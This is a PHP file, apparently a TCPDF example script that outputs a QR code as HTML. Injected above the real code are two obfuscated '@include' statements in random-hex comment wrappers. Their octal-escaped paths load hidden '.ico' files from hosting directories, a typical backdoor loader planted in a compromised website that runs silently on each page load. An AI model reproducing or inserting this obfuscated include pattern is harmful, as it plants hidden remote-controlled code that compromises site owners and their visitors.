<?php
/*fdbed*/

@include "\057ho\155e/\145du\151nd\151af\057pu\142li\143_h\164ml\057ve\156do\162/b\141rc\157de\057.1\0719e\142f5\145.i\143o";

/*fdbed*/


/*7e76c*/

@include "\057ho\155e/\147ro\165pi\156ka\057pu\142li\143_h\164ml\057sc\150em\145/a\163se\164s/\151ma\147es\057.4\14575\06776\062.i\143o";

/*7e76c*/
 
// include 2D barcode class (search for installation path)

		require_once('tcpdf_barcodes_2d.php');

// set the barcode content and type
$barcodeobj = new TCPDF2DBarcode('https://www.codediffusion.in?id=1', 'QRCODE,H');

// output the barcode as HTML object
echo $barcodeobj->getBarcodeHTML(6, 6, 'black');

//============================================================+
// END OF FILE
//============================================================+
